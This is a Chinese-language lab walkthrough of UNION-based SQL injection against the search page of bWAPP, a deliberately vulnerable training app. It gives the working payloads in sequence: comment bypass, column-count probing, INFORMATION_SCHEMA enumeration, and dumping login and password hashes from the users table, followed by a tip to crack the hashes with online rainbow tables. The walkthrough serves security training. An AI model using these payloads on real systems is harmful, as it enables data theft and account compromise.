# SQl get search 注入

## 分析 

直接点击search会列举当前数据表中全部内容,显然在这里需要我们注入

## low

输入单引号,报错提示在 % 附近.猜测参数被形如'% %'形式包裹没有过滤,直接带入数据库查询

#### 1 尝试用1'-- - 绕过成功,直接使用sql语句测试即可

#### 2 探测输出位置

依次输入 select 1...select 1,2 直至 

1'union select 1,2,3,4,5,6,7-- -

成功返回 2,3,5,4,Link 视为成功

#### 3 进行详细探测

1'union select 1,table_name,database(),user(),version(),6,7 from INFORMATION_SCHEMA.tables where table_schema=database()-- -

将会返回具体信息,查看当前数据库

返回

```
Title 	Release 	Character 	Genre 	IMDb
blog 	bWAPP 	5.5.47-0ubuntu0.14.04.1 	root@localhost 	Link
heroes 	bWAPP 	5.5.47-0ubuntu0.14.04.1 	root@localhost 	Link
movies 	bWAPP 	5.5.47-0ubuntu0.14.04.1 	root@localhost 	Link
users 	bWAPP 	5.5.47-0ubuntu0.14.04.1 	root@localhost 	Link
visitors 	bWAPP 	5.5.47-0ubuntu0.14.04.1 	root@localhost 	Link
```

可以看出user应该存储了我们想要的信息

#### 4 对users表结构探测

1'union select 1,column_name,3,4,5,6,7 from INFORMATION_SCHEMA.columns where table_name='users'-- -

随即返回

```
id 	3 	5 	4 	Link
login 	3 	5 	4 	Link
password 	3 	5 	4 	Link
email 	3 	5 	4 	Link
secret 	3 	5 	4 	Link
activation_code 	3 	5 	4 	Link
activated 	3 	5 	4 	Link
reset_code 	3 	5 	4 	Link
admin 	3 	5 	4 	Link
```

可以看出 id,login,passord就是我们预期的字段

#### 5 获取数据

1'union select 1,id,login,password,5,6,7 from users-- -

```
1 	A.I.M. 	5 	6885858486f31043e5839c735d99457f045affd0 	Link
2 	bee 	5 	6885858486f31043e5839c735d99457f045affd0 	Link
```

密码直接网上查在线彩虹表解密即可
